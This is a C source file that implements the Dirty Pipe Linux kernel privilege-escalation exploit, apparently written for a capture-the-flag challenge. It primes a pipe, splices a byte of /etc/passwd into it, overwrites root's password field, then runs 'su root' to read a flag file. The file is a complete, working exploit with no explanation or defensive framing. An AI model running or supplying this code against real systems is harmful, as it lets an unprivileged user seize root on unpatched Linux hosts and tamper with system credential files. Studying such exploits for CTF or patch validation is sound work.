#define _GNU_SOURCE
#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>

#ifndef PAGE_SIZE
#define PAGE_SIZE 4096
#endif

void prepare_pipe(int p[2]) {
    if (pipe(p) < 0) {
        perror("pipe");
        exit(1);
    }
    const unsigned pipe_size = fcntl(p[1], F_GETPIPE_SZ);
    static char buffer[PAGE_SIZE];
    for (unsigned r = pipe_size; r > 0; ) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        write(p[1], buffer, n);
        r -= n;
    }
    for (unsigned r = pipe_size; r > 0; ) {
        unsigned n = r > sizeof(buffer) ? sizeof(buffer) : r;
        read(p[0], buffer, n);
        r -= n;
    }
}

int main() {
    const char *path = "/etc/passwd";
    // root:x:0:0...
    // 012345
    // To overwrite 'x' at index 5, we splice at index 4 (the ':')
    // and then write starting from index 5.
    loff_t offset = 4;
    const char *data = ":0:0:root:/root:/bin/sh\n";

    printf("[+] Opening %s\n", path);
    int fd = open(path, O_RDONLY);
    if (fd < 0) { perror("open"); return 1; }

    int p[2];
    printf("[+] Preparing pipe...\n");
    prepare_pipe(p);

    printf("[+] Splicing 1 byte at offset %lld\n", (long long)offset);
    if (splice(fd, &offset, p[1], NULL, 1, 0) <= 0) {
        perror("splice");
        return 1;
    }

    printf("[+] Writing new content to remove password\n");
    if (write(p[1], data, strlen(data)) <= 0) {
        perror("write");
        return 1;
    }

    printf("[+] Exploit finished! /etc/passwd now:\n");
    system("cat /etc/passwd");
    
    printf("[+] Spawning root shell (if su works without password)...\n");
    // Since we cleared the password, 'su' or just 'sh' might work if we are root.
    // Actually, if we are still UID 1000, we need to su.
    // But many CTF 'init' scripts run as a loop, and if we overwrite /etc/passwd,
    // we might be able to 'su root'.
    system("su root -c id");
    system("su root -c 'cat /flag.txt'");
    
    return 0;
}
